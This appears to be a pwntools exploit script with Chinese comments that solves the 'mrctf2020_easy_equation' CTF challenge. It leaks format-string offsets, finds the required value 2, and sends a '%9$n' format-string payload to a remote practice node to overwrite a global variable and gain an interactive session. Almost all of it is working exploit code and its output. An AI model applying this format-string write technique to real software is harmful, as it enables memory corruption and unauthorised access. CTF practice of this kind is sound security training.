# fmt的偏移为：8
# (开头需要多一个a补全偏移)
'''
./mrctf2020_easy_equation 
aaaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p                                                        *
aaaaaaaaa.0x184fa2a1.0xfbad2288.0xe7b05d5f.0x184fa2ce.0x410.0x7ffd6f0b61a0.0x61007ffd6f0b61e8.0x6161616161616161.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e
'''
'''
for judge in range(0, 100):
    if 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198:
        print(judge)  # 2
        break
'''
from pwn import *

# r = process('mrctf2020_easy_equation')
r = remote('node5.buuoj.cn', 26554)
context.log_level = 'debug'

judge = 0x60105C

# 覆盖judge值为2
# 'aa%9$naaa' => 'a' + 'a%9$naaa' => 补全偏移的1个a + 偏移为8的位置（64位下长度为8个字节）
#  %9$n把偏移9位置的值修改为'aa'的长度2
payload = b'aa%9$naaa' + p64(judge)
#          偏移8           偏移9
r.sendline(payload)
r.interactive()
